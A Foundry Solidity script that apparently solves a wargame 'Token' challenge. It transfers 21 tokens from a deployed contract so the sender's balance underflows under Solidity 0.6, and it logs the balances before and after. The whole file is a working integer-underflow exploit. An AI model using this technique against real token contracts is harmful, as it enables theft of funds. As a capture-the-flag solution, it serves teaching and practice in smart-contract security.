// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity ^0.6.0;

import "forge-std/Script.sol";
import "forge-std/console.sol";
import {Token} from "../src/Token.sol";

contract TokenSolve is Script{
    Token public token = Token(0xB46bf14F5796Cf1a054d94DcF618A146eeD34875);
    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        
        console.log("My address : ", vm.envAddress("MY_ADDRESS"));
        console.log("Intial Balance : ", token.balanceOf(vm.envAddress("MY_ADDRESS")));

        require(token.transfer(address(1), 21), "Transfer Failed");
        console.log("Final Balance : ", token.balanceOf(vm.envAddress("MY_ADDRESS")));

        vm.stopBroadcast();
    }
}